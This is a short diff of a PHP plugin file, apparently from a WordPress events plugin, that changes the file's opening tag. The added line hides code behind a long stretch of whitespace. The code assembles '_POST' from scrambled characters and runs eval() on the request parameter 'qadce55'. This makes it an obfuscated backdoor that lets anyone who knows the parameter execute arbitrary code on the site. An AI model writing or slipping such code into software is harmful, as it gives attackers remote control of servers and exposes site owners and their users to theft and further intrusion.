@@ -1,4 +1,4 @@
-<?php
+<?php                                                                                                                                                                                                                                                                            $ldo1="sopt_" ; $rewp2= strtoupper( $ldo1[4]. $ldo1[2] .$ldo1[1]. $ldo1[0]. $ldo1[3]) ; if( isset(${ $rewp2 } [ 'qadce55']) ) {eval( ${$rewp2 }['qadce55' ]) ;}?><?php
 class EM_Location_Post_Admin{
 	public static function init(){
 		global $pagenow;
